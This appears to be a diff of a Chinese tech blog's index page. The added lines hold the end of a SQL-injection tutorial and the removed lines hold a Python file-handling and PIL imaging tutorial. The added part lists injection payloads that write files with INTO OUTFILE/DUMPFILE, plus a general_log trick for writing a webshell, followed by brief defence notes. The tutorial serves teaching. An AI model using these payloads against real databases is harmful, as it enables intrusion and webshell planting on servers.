+<pre><code>id=-1&#39; union select &quot;Contents&quot; into outfile &quot;Paht&quot;
+id=-1&#39; union select &quot;Contents&quot; into dumpfile &quot;Path&quot;
+id=1&#39; into outfile &#39;Path&#39; lines terminated by &#39;Contents&#39; --+
+select * from admin where id=&#39;1&#39; into outfile &#39;path&#39; lines terminated by &#39;contents&#39;
+id=1&#39; limit 1 into outfile &#39;Path&#39; lines terminated by &#39;Contents&#39; --+</code></pre>
+<p>tips：</p>
+<pre><code>outfile可以写入多行数据，并且字段和行终止符都可以作为格式输出。
+dumpfile只能写一行，并且输出中不存在任何格式。</code></pre>
+<h3 id="利用日志写马"><a href="#利用日志写马" class="headerlink" title="利用日志写马"></a>利用日志写马</h3><pre><code>set global general_log=&quot;ON&quot;
+set global general_log_file=&quot;Path&quot;
+union select 查询</code></pre>
+<p>过滤：preg_match正则匹配 </p>
+<pre><code>preg_match(&#39;unon&#39;,$sql)&#123;
+
+&#125;</code></pre>
+<p>编码：宽字节注入</p>
+<p>预编译：mysqli_pdo</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Python/运用Python语言(四)-科学计算和可视化02" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -2774,575 +3235,6 @@ fw.close()</code></pre>
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/04/05/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%8D%81)-%E6%96%87%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%9602/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Python/深入Python语言(九)-文件和数据格式化01" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/27/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B9%9D)-%E6%96%87%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%9601/">深入Python语言九-文件和数据格式化01</a>
-    </h1>
-  
-
-        
-        <a href="/2021/03/27/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B9%9D)-%E6%96%87%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%9601/" class="archive-article-date">
-  	<time datetime="2021-03-27T13:27:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-27</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="文件的使用"><a href="#文件的使用" class="headerlink" title="文件的使用"></a>文件的使用</h2><h3 id="文件概述"><a href="#文件概述" class="headerlink" title="文件概述"></a>文件概述</h3><p><strong>Python能够以文本和二进制两种方式处理文件</strong></p>
-<p>（1）文件是一个存储在辅助存储器上的数据序列，可以包含任何数据内容。文件包括两种类型：<strong>文本文件和二进制文件。</strong></p>
-<p>（2）文本文件一般由单一特定编码的字符组成，如UTF-8编码，内容容易统一展示和阅读。由于文本文件存在编码，因此，它也可以被看作是存储在磁盘上的长字符串，例如一个txt格式的文本文件。</p>
-<p>（3）二进制文件直接由比特0和比特1组成，没有统一字符编码，文件内部数据的组织格式与文件用途有关。<strong>二进制文件与文本文件最主要的区别在于是否有统一的字符编码。</strong>二进制文件没有统一的字符编码，只能当作字节流，而不能看做是字符串。</p>
-<p>（4）无论文件是创建为文本文件还是二进制文件，都可以用“文本文件方式”和“二进制文件方式”打开，但打开后的操作不同。</p>
-<pre><code class="python">textFile = open(&quot;1.txt&quot;,&quot;rt&quot;)   #t表示文本文件方式
-print(textFile.readline())    #readline()是读出一行内容，read()是读出整个文件的内容
-textFile.close()              #关闭该文件
-binFile = open(&quot;1.txt&quot;,&quot;rb&quot;)   #b表示二进制文件方式
-print(binFile.readline())
-binFile.close()
-
-#运行结果
-中国是个伟大的国家！
-
-b&#39;\xe4\xb8\xad\xe5\x9b\xbd\xe6\x98\xaf\xe4\xb8\xaa\xe4\xbc\x9f\xe5\xa4\xa7\xe7\x9a\x84\xe5\x9b\xbd\xe5\xae\xb6\xef\xbc\x81\n&#39;</code></pre>
-<p>（5）采用文本方式读入文件，<strong>文件经过编码形成字符串，打印出有含义的字符；采用二进制方式打开文件，文件被解析为字节(Byte)流。</strong>由于存在编码，<strong>字符串中的一个字符由两个字节表示。</strong></p>
-<h3 id="文件的打开关闭"><a href="#文件的打开关闭" class="headerlink" title="文件的打开关闭"></a>文件的打开关闭</h3><p>（1）Python对文本文件和二进制文件采用统一的操作步骤，即“打开——操作——关闭”。</p>
-<p>（2）操作系统中的文件默认处于存储状态，首先需要将其打开，使得当前程序有权操作这个文件，打开不存在的文件可以创建文件。<strong>打开后的文件处于占用状态，此时，另一个进程不能操作这个文件。</strong></p>
-<p>（3）可以通过一组方法读取文件的内容或向文件写入内容，此时，文件作为一个数据对象存在，采用<a>.<b>()方式进行操作。</p>
-<p>（4）操作之后需要将文件关闭，关闭将释放对文件的控制使文件恢复存储状态，此时，另一个进程将能够操作这个文件。</p>
-<p><img src="https://i.loli.net/2021/03/30/3RkTJ7EbMZf8BuP.png" alt="image-20210330112125720"></p>
-<p>（5）Python通过解释器内置的open()函数打开一个文件，并实现该文件与一个程序变量的关联，open()函数格式如下：</p>
-<pre><code>&lt;变量名&gt; = open(&lt;文件名&gt;, &lt;打开模式&gt;)</code></pre>
-<p>（6）open()函数有两个参数：文件名和打开模式。文件名可以使文件的实际名字，<strong>也可以是包含完整路径的名字</strong>。<strong>打开模式用于控制使用何种方式打开文件</strong>,open()函数提供了7种基本的打开模式。</p>
-<table>
-<thead>
-<tr>
-<th>文件的打开模式</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>‘r’</td>
-<td>只读模式，若文件不存在，返回异常FileNotFoundError，默认值</td>
-</tr>
-<tr>
-<td>‘w’</td>
-<td>覆盖写模式，文件不存在则创建，存在则完全覆盖</td>
-</tr>
-<tr>
-<td>‘x’</td>
-<td>创建写模式，文件不存在则创建，存在则返回异常FileExistsError</td>
-</tr>
-<tr>
-<td>‘a’</td>
-<td>追加写模式，文件不存在则创建，存在则在文件最后追加内容</td>
-</tr>
-<tr>
-<td>‘b’</td>
-<td>二进制文件模式</td>
-</tr>
-<tr>
-<td>‘t’</td>
-<td>文本文件模式，默认值</td>
-</tr>
-<tr>
-<td>‘+’</td>
-<td>与/r/w/x/a一同使用，在原功能基础上增加同时读写功能</td>
-</tr>
-</tbody></table>
-<p>（7）打开模式使用字符串方式表示，根据字符串定义，单引号或者双引号均可。上述打开模式中，’r’、’w’、’x’、’a’可以和’b’、’t’、’+’组合使用，形成既表达读写又表达文件模式的方式。例如，open()函数默认采用’rt’（文本只读）模式，读入程序所在目录中1.txt文件：</p>
-<pre><code>textFile = open(&#39;1.txt&#39;, &#39;r&#39;)
-或者
-textFiel = open(&#39;1.txt&#39;)</code></pre>
-<p>（8）读取一个二进制文件，如一张图片、一段视频或者一段音乐，需要使用文件打开模式’rb’。例如，打开一个名为”music.mp3“的音频文件：</p>
-<pre><code>binFile = open(&#39;music.mp3&#39;, &#39;rb&#39;)</code></pre>
-<p>（9）文件结束后要用close()方法关闭，释放文件的使用授权，该方法的使用方式如下：</p>
-<pre><code>&lt;变量名&gt;.close()</code></pre>
-<h3 id="文件的读写"><a href="#文件的读写" class="headerlink" title="文件的读写"></a>文件的读写</h3><p>（1）当文件被打开后，根据打开的方式不同可以对文件进行相应的读写操作。</p>
-<ul>
-<li>当文件以文本文件方式打开后，读写按照字符串方式，采用当前计算机使用的编码或指定编码。</li>
-<li>当文件以二进制文件方式打开时，读写按照字节流方式。</li>
-</ul>
-<p>（2）Python提供3个常用的文件内容读取方法，如下表所示：</p>
-<table>
-<thead>
-<tr>
-<th>操作方法</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>&lt;file&gt;.read(size = -1)</td>
-<td>从文件中读入整个文件内容，若给出参数，读入前size长度的字符串或字节流</td>
-</tr>
-<tr>
-<td>&lt;file&gt;.readline(size = -1)</td>
-<td>从文件中读入一行内容，如果给出参数，读入该行前size长度的字符串或字节流</td>
-</tr>
-<tr>
-<td>&lt;file&gt;.readlines(hint = -1)</td>
-<td>从文件中读入所有行，以每行为元素形成一个列表，若给出参数，读入hint行</td>
-</tr>
-</tbody></table>
-<p>（3）文本文件逐行打印：用户输入文件路径，以文本文件方式读入文件内容并逐行打印。</p>
-<pre><code class="python">fname = input(&quot;请输入要打开的文件：&quot;)
-fo = open(fname, &quot;r&quot;)
-for line in fo.readlines():
-    print(line)
-fo.close()
-&#39;&#39;&#39;
-程序首先提示用户输入一个文件名，然后打开文件并复制给文件对象变量fo。文件的全部内容通过fo.readlines()方法读入到一个列表中，列表中的每个元素是文件一行的内容，然后通过for-in方式遍历列表，处理每行内容。
-&#39;&#39;&#39;</code></pre>
-<p>（4）上述实例存在一个缺点：当读入文件非常大时，一次性将内容读取到列表中会占用很多内存，影响程序执行速度。</p>
-<p>解决方法：<strong>逐行读入内容到内存，并逐行处理。</strong>Python将文件本身作为一个行序列，遍历文件的所有行可以直接这样完成：</p>
-<pre><code class="python">fname = input(&quot;请输入要打开的文件：&quot;)
-fo = open(fname, &quot;r&quot;)
-for line in fo:
-    print(line)
-fo.close()
-
-&#39;&#39;&#39;
-若程序需要逐行处理文件内容，建议采用上述代码中的2到5行组成的格式。
-fo = open(fname, &quot;r&quot;)
-for line in fo:
-    #处理一行数据
-fo.close()
-&#39;&#39;&#39;</code></pre>
-<p>扩展：<strong>文件的换行符</strong>：若采用二进制方式打开文件，换行符只是一个符号，对应一个字节，表示为“\n”。若采用文本方式打开文件，换行符表示一行的结束。</p>
-<p>（5）Python提供3个与文件内容写入有关的方法，如下表所示。</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>&lt;file&gt;.write(s)</td>
-<td>向文件中写入一个字符串或字节流</td>
-</tr>
-<tr>
-<td>&lt;fiel&gt;.writelines(lines)</td>
-<td>将一个元素全为字符串的列表写入文件</td>
-</tr>
-<tr>
-<td>&lt;file&gt;.seek(offset)</td>
-<td>改变当前文件操作指针的位置，offset的值：0——文件开头；1——当前位置；2——文件结尾</td>
-</tr>
-</tbody></table>
-<p>（6）向文件写入一个列表，并打印输出结果，代码如下：</p>
-<pre><code class="python">fname = input(&quot;请输入要写入的文件：&quot;)
-fo = open(fname,&#39;w+&#39;)
-ls = [&quot;唐诗&quot;,&quot;宋词&quot;,&quot;元曲&quot;]
-fo.writelines(ls)
-for line in fo:
-    print(line)
-fo.close()
-#执行结果：
-&gt;&gt;&gt;请输入要写入的文件：test.txt
-&gt;&gt;&gt;
-#linxu下查看文件
-cat test.txt
-唐诗宋词元曲</code></pre>
-<p>（7）上例中ls内容被写入了文件，但第5行至第7行的代码没有将内容打印出来。<strong>这是因为文件写入内容后，当前文件操作指针在写入内容的后面，第5行至第7行的代码从指针开始向后读入并打印内容，被写入的内容却在指针前面，因此未能被打印出来。</strong>为此，可以在写入文件后增加一条代码fo.seek(0)将文件操作指针返回到文件开始，即可显示写入的内容。</p>
-<pre><code class="python">fname = input(&quot;请输入要写入的文件：&quot;)
-fo = open(fname,&quot;w+&quot;)
-ls = [&quot;唐诗&quot;,&quot;宋词&quot;,&quot;元曲&quot;]
-fo.writelines(ls)              #writelinses()方法并不在列表后面增加换行，只是将列表内容直接排列输出。
-fo.seek(0)
-for line in fo:
-    print(line)
-fo.close()
-
-#程序执行结果：
-&gt;&gt;&gt;请输入要写入的文件：test1.txt
-唐诗宋词元曲</code></pre>
-<h2 id="PIL库的使用"><a href="#PIL库的使用" class="headerlink" title="PIL库的使用"></a>PIL库的使用</h2><h3 id="PIL库概述"><a href="#PIL库概述" class="headerlink" title="PIL库概述"></a>PIL库概述</h3><p>（1）PIL（Python Image Library）库是Python语言的第三方库，需要通过pip工具安装。注：安装库的名字是pillow。</p>
-<pre><code class="python">pip3 install pillow</code></pre>
-<p>（2）PIL库支持图像存储、显示和处理，它能够处理几乎所有图片格式，可以完成对图像的缩放、剪裁、叠加以及向图像添加线条、图像和文字等操作。</p>
-<p>（3）PIL库主要可以实现<strong>图像归档和图像处理</strong>两方面功能需求</p>
-<ul>
-<li>图像归档：对图像进行批处理、生成图像预览、图像格式转换等。</li>
-<li>图像处理：图像基本处理、像素处理、颜色处理等。</li>
-</ul>
-<p>（4）PIL库最常用的3个子库：Image、ImageFilter、ImageEnhance。PIL库共包括21个与图片相关的类，参考网站<a target="_blank" rel="noopener" href="http://effbot.org/imagingbook/">http://effbot.org/imagingbook/</a></p>
-<h3 id="PIL库Image类解析"><a href="#PIL库Image类解析" class="headerlink" title="PIL库Image类解析"></a>PIL库Image类解析</h3><p>（1）Image是PIL最重要的类，它代表一张图片。</p>
-<pre><code class="python">from PIL import Image       #引入Image类</code></pre>
-<p>（2）在PIL中，任何一个图像文件都可以用Image对象来表示。下表给出了Image类的图像读取和创建方法。</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Image.open(filename)</td>
-<td>根据参数加载图像文件</td>
-</tr>
-<tr>
-<td>Image.new(mode,size,color)</td>
-<td>根据给定参数创建一个新的图像</td>
-</tr>
-<tr>
-<td>Image.open(StringIO.StringIO(buffer))</td>
-<td>从字符串中获取图像</td>
-</tr>
-<tr>
-<td>Image.frombytes(mode,size,data)</td>
-<td>根据像素点data创建图像</td>
-</tr>
-<tr>
-<td>Image.verify()</td>
-<td>对图像文件完整性进行检查，返回异常</td>
-</tr>
-</tbody></table>
-<p>（3）通过Image打开图像文件时，图像的栅格<strong>数据不会被直接解码或者加载</strong>，程序只是读取了图像文件头部的元数据信息，这部分信息标识了图像的<strong>格式、颜色、大小</strong>等。所以打开一个文件会很快，与图像的存储和压缩方式无关。</p>
-<p>（4）要加载一个图像文件，最简单的形式如下，之后所有的操作对im起作用。</p>
-<pre><code class="python">&gt;&gt;&gt; from PIL import Image
-&gt;&gt;&gt; im = Image.open(&quot;/media/fafusr/28AC2EBFAC2E8780/图片/我的图片/3.jpg&quot;) #绝对路径
-&gt;&gt;&gt; im = Image.open(&quot;3.jpg&quot;)</code></pre>
-<p>（5）在使用IDLE交互方式处理图片文件时，建议采用文件的绝对路径；如果使用Python文件形式，建议采用相对路径，将文件和程序放到一个目录中。</p>
-<p>（6）Image类有4个处理图片的常用属性。</p>
-<table>
-<thead>
-<tr>
-<th>属性</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Image.format</td>
-<td>标识图像格式或来源，若图像不是从文件读取，值为None</td>
-</tr>
-<tr>
-<td>Image.mode</td>
-<td>图像的色彩模式，”L”为灰度图像、”RGB”为真色彩图像、”CMYK”为出版图像</td>
-</tr>
-<tr>
-<td>Image.size</td>
-<td>图像宽度和高度，单位是像素(px)，返回值是二元元组(tuple)</td>
-</tr>
-<tr>
-<td>Image.palette</td>
-<td>调色板属性，返回一个ImagePalette类型</td>
-</tr>
-</tbody></table>
-<p>查看已经读取的图像文件的属性如下：</p>
-<pre><code class="python">&gt;&gt;&gt; print(im.format,im.size,im.mode)
-JPEG (1080, 1080) RGB</code></pre>
-<p>拓展：CMYK色彩是彩色印刷时采用的一套色彩体系，也称印刷四色。</p>
-<p>（7）Image还能读取序列类图像文件，包括GIF、FLI、FLC、TIFF等格式文件。open()方法打开一个图像是自动加载序列中的第一帧，使用seek()和tell()可以在不同帧之间移动。</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Image.seek(frame)</td>
-<td>跳转并返回图像指定的帧</td>
-</tr>
-<tr>
-<td>Image.tell()</td>
-<td>返回当前帧的序号</td>
-</tr>
-</tbody></table>
-<p>（8）GIF文件图像提取：对一个GIF格式动态文件，提取其中的各帧图像，并保存为文件。</p>
-<pre><code class="python">from PIL import Image
-im = Image.open(&#39;pybit.gif&#39;)    # 读入一个GIF文件
-try:
-    im.save(&#39;picframe&#123;:02d&#125;.png&#39;.format(im.tell()))#&#123;:02d&#125;表示两个宽度的十进制显示，不够两位用0填充。
-    while True:
-        im.seek(im.tell()+1)
-        im.save(&#39;picframe&#123;:02d&#125;.png&#39;.format(im.tell()))
-except:
-    print(&quot;处理结束&quot;)</code></pre>
-<p>（9）Image类的图像转换和保存方法如下表所示。</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Image.save(filename, format)</td>
-<td>将文件保存为filename文件名，format是图片格式</td>
-</tr>
-<tr>
-<td>Image.convert(mode)</td>
-<td>使用不同的参数，转换图像为新的模式</td>
-</tr>
-<tr>
-<td>Image.thumbnail(size)</td>
-<td>创建图形的缩略图，size是缩略图尺寸的二元元组</td>
-</tr>
-</tbody></table>
-<p>（10）若调用save()时不指定保存格式，PIL将自动根据filename的后缀名存储图像，例如上例提取GIF图像的.png；若指定了格式，则按照格式存储。</p>
-<p>（11）搭配采用open()和save()方法可以实现图像的格式转换，例如，将jpg格式转换为png格式。</p>
-<pre><code class="python">&gt;&gt;&gt; from PIL import Image
-&gt;&gt;&gt; im = Image.open(&quot;3.jpg&quot;)    
-&gt;&gt;&gt; im.save(&quot;3.png&quot;)    #save()方法主要用于将文件保存到硬盘，原有的3.jpg文件依然存在。PIL库还提供了更加强大的格式转换方式。</code></pre>
-<p>（12）生成3.jpg的缩略图，代码如下：</p>
-<pre><code class="python">&gt;&gt;&gt; im.thumbnail((128,128))   #(128,128)是缩略图的尺寸
-&gt;&gt;&gt; im.save(&quot;3TN&quot;,&quot;JPEG&quot;)</code></pre>
-<p>（13）Image类可以缩放和旋转图像，方法如下表所示：</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Image.resize(size)</td>
-<td>按size大小调整图像，生成副本</td>
-</tr>
-<tr>
-<td>Image.rotate(angle)</td>
-<td>以逆时针旋转的角度值angle作为参数来旋转图像，生成副本</td>
-</tr>
-</tbody></table>
-<p>（14）Image类能够对每个像素点或者一幅RGB图像的每个通道单独进行操作，如下表所示</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Image.point(func)</td>
-<td>根据函数func的功能对每个元素进行运算，返回图像副本</td>
-</tr>
-<tr>
-<td>Image.split()</td>
-<td>提取RGB图像的每个颜色通道，返回图像副本</td>
-</tr>
-<tr>
-<td>Image.merge(mode,bands)</td>
-<td>合并通道，其中mode表示色彩，bands表示新的色彩通道，再合成一幅新的图像</td>
-</tr>
-<tr>
-<td>Image.blend(im1,im2,alpha)</td>
-<td>将两幅图片im1和im2按照如下公式插值后生成新的图像:im1*(1.0-alpha)+im2*alpha</td>
-</tr>
-</tbody></table>
-<p>（15）图像的颜色交换，通过分离RGB图片的3个颜色通道实现颜色交换。代码如下：</p>
-<pre><code class="python">&gt;&gt;&gt; from PIL import Image
-&gt;&gt;&gt; im = Image.open(&#39;01.jpg&#39;)
-&gt;&gt;&gt; r, g, b = im.split()
-&gt;&gt;&gt; om = Image.merge(&quot;RGB&quot;, (b, g, r))
-&gt;&gt;&gt; om.save(&#39;001.jpg&#39;)
-&gt;&gt;&gt; exit()</code></pre>
-<p><img src="https://i.loli.net/2021/03/31/PaSwA1Mckibyz4g.png" alt="image-20210331122318860"></p>
-<p><img src="https://i.loli.net/2021/03/31/FV3oAvJiQLw4brY.png" alt="image-20210331122508093"></p>
-<p>（16）操作图像的每个像素点需要通过函数实现，可以采用lambda函数和point()方法。</p>
-<pre><code class="python">&gt;&gt;&gt; from PIL import Image
-&gt;&gt;&gt; im = Image.open(&#39;/media/fafusr/28AC2EBFAC2E8780/Python/program/第七章/01.jpg&#39;)
-&gt;&gt;&gt; r,g,b = im.split()
-&gt;&gt;&gt; newg = g.point(lambda i:i*0.9)
-&gt;&gt;&gt; newb = b.point(lambda i:i&lt;100)
-&gt;&gt;&gt; om = Image.merge(im.mode,(r,newg,newb))
-&gt;&gt;&gt; om.save(&#39;/media/fafusr/28AC2EBFAC2E8780/Python/program/第七章/01merge.jpg&#39;)</code></pre>
-<p><img src="https://i.loli.net/2021/03/31/MKAFULqrbl5BaE3.png" alt="image-20210331123014245"></p>
-<h3 id="图像的过滤和增强"><a href="#图像的过滤和增强" class="headerlink" title="图像的过滤和增强"></a>图像的过滤和增强</h3><p>（1）PIL库的ImageFilter类和ImageEnhance类提供了过滤图像和增强图像的方法。ImageFilter类提供了10种预定义图像过滤方法。如下表所示：</p>
-<table>
-<thead>
-<tr>
-<th>方法表示</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>ImageFilter.BLUR</td>
-<td>图像的模糊效果</td>
-</tr>
-<tr>
-<td>ImageFilter.CONTOUR</td>
-<td>图像的轮廓效果</td>
-</tr>
-<tr>
-<td>ImageFilter.DETAIL</td>
-<td>图像的细节效果</td>
-</tr>
-<tr>
-<td>ImageFilter.EDGE_ENHANCE</td>
-<td>图像的边界加强效果</td>
-</tr>
-<tr>
-<td>ImageFilter.EDGE_ENHANCE_MORE</td>
-<td>图像的阀值边界效果加强</td>
-</tr>
-<tr>
-<td>ImageFilter.EMBOSS</td>
-<td>图像的浮雕效果</td>
-</tr>
-<tr>
-<td>ImageFilter.FIND_EDGES</td>
-<td>图像的边界效果</td>
-</tr>
-<tr>
-<td>ImageFilter.SMOOTH</td>
-<td>图像的平滑效果</td>
-</tr>
-<tr>
-<td>ImageFilter.SMOOTH_MORE</td>
-<td>图像的阀值平滑效果</td>
-</tr>
-<tr>
-<td>ImageFilter.SHARPEN</td>
-<td>图像的锐化效果</td>
-</tr>
-</tbody></table>
-<p>（2）利用Image类的filter()方法可以使用ImageFilter类，使用方式如下：</p>
-<pre><code class="python">Image.filter(ImageFilter.fuction)</code></pre>
-<p>（3）图像轮廓获取。</p>
-<pre><code class="python">from PIL import Image
-from PIL import ImageFilter
-im = Image.open(&quot;01.jpg&quot;)
-om = im.filter(ImageFilter.CONTOUR)
-om.save(&quot;01Contour.jpg&quot;)</code></pre>
-<p><img src="https://i.loli.net/2021/03/31/SBdyCt7V1rULe39.png" alt="image-20210331194927169"></p>
-<p>（4）ImageEnhance类提供了更高级的图像增强功能，如调整色彩度、亮度、对比度、锐化等。如下表所示。</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>ImageEnhance.enhance(factor)</td>
-<td>对选择属性的数值增强factor倍</td>
-</tr>
-<tr>
-<td>ImageEnhance.Color(im)</td>
-<td>调整图像的颜色平衡</td>
-</tr>
-<tr>
-<td>ImageEnhance.Contrast(im)</td>
-<td>调整图像的对比度</td>
-</tr>
-<tr>
-<td>ImageEnhance.Brightness(im)</td>
-<td>调整图像的亮度</td>
-</tr>
-<tr>
-<td>ImageEnhance.Sharpness(im)</td>
-<td>调整图像的锐度</td>
-</tr>
-</tbody></table>
-<p>（5）图像的对比度增强</p>
-<pre><code class="python">from PIL import Image
-from PIL import ImageEnhance
-im = Image.open(&quot;01.jpg&quot;)
-om = ImageEnhance.Contrast(im)
-om.enhance(20).save(&#39;01Contrast.jpg&#39;)</code></pre>
-<p><img src="https://i.loli.net/2021/03/31/YmFkhMqzOUdygJ1.png" alt="image-20210331200703081"></p>
-<h3 id="图像的字符画绘制"><a href="#图像的字符画绘制" class="headerlink" title="图像的字符画绘制"></a>图像的字符画绘制</h3><p>（1）位图图片是由不同颜色像素点组成的规则分布，如果采用字符串代替像素，图像就成为了字符画。</p>
-<p>（2）首先定义一个字符集，将这个字符集代替图像中的像素点，使得每个字符对应图像中的不同颜色。字符的种类越多则越能还原图像的色彩变化，图片也更加富有层次感。</p>
-<pre><code class="python">ascii_char = list(&quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjf/1234568795t\/|()1&#123;&#125;[]?-_+~&lt;&gt;i!;:,\^`.&#39;&quot;)</code></pre>
-<p>（3）图像的色彩信息无法被黑白ASCII字符直接模拟，可以使用灰度值将彩色图像转换为高质量的黑白文稿。灰度值指黑白图像中的颜色深度，<strong>白色为255,黑色为0</strong>。</p>
-<p>（4）这里定义，灰度值从大到小依次使用字符集中从左到右的符号，因此，可以直接求出不同灰度值在字符集中对应的字符编号。</p>
-<p>（5）定义色彩向灰度转换的公式如下，其中**R、G、B分别是像素点的RGB颜色值：</p>
-<pre><code class="python">Gray = R * 0.2126 + G * 0.7152 + B * 0.0722</code></pre>
-<p>像素的RGB颜色值与字符集的对应函数如下：</p>
-<pre><code class="python">def get_char(r, b, g, alpha=256):
-    if alpha == 0:
-        return &#39; &#39;
-    gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b)
-    unit = 256 / len(ascii_char)
-    return ascii_char[gray//unit]</code></pre>
-<p>（6）为使生成的字符画有最佳效果，可利用PIL库中的Image类的resize(size)函数对图片重新设定大小size。size是一个二元元组，分别表示<strong>新图像的长度和宽度。</strong>resize()函数不是简单地改变图像的大小，而是对像素在新尺寸下重新排列。</p>
-<p>（7）创建一个空字符串txt，然后利用一个嵌套循环向里面添加字符。<strong>im.getpixel()方法可以返回给定图像位置的像素值。</strong>若图像为多通道，则返回一个RGB颜色元组。</p>
-<p>（8）@#￥这类字符有浓密的色彩感，而_!{}/|这类字符空白较多，适合表示浅色。生成字符画后可根据字符集和图像的对照适当修改字符排列顺序。如将背景色对应的字符修改为_或/，将浓墨重彩的地方使用@*或B&amp;表示会更有层次感。</p>
-<pre><code class="python">from PIL import Image
-ascii_char = list(&quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjf/1234568795t\/|()1&#123;&#125;[]?-_+~&lt;&gt;i!;:,\^`.&quot;)
-def get_char(r, b, g, alpha=256):
-    if alpha == 0:
-        return &#39; &#39;
-    gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b)
-    x = int((gray / (alpha + 1.0)) * len(ascii_char))
-    return ascii_char[x]
-def main():
-    im = Image.open(&quot;3.jpg&quot;)
-    width, height = 100, 60
-    im = im.resize((width,height))
-    txt = &quot;&quot;
-    for i in range(height):
-        for j in range(width):
-            txt += get_char(*im.getpixel((j,i)))
-        txt += &#39;\n&#39;
-    fo = open(&quot;pic_char.txt&quot;,&quot;w&quot;)
-    fo.write(txt)
-    fo.close()
-main()</code></pre>
-<p>扩展：位图图像和矢量图</p>
-<ul>
-<li>位图亦称为点阵图像，由像素阵列组成。放大时会失真，但却能表达色彩丰富的图像效果。</li>
-<li>矢量图使用直线和曲线来描述图形，复杂图形是通过数学公式计算获得的。放大、缩小或旋转时不失真，但难以表现色彩层次丰富的图像效果。</li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/27/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B9%9D)-%E6%96%87%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%9601/">展开全文 >></a>
         </p>
       
 
